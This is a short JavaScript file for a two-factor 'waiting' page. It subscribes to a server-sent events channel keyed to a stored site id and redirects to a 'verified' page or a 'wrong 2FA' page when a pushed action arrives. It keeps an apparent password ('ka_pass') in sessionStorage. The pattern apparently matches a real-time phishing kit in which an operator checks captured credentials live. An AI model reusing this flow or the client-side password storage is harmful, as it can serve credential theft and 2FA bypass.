(function () {
  var rawId  = sessionStorage.getItem("ka_site_id") || "";
  var siteId = rawId + "_2fa";
  if (!rawId) { window.location.href = "login.html"; return; }
  var done   = false;
  var sseSub = null;
  function go(action) {
    if (done) return;
    done = true;
    if (sseSub) sseSub.close();
    setTimeout(function() {
      if (action === "success")  { sessionStorage.removeItem("ka_pass"); window.location.href = "verified.html"; }
      else if (action === "wrong2fa") { window.location.href = "2fa.html?error=wrong"; }
    }, 200);
  }
  sseSub = KA.subscribe(siteId, {
    action: function(data) { if (data.siteId === siteId) go(data.action); }
  });
  window.addEventListener("beforeunload", function() { if (sseSub) sseSub.close(); });
})();
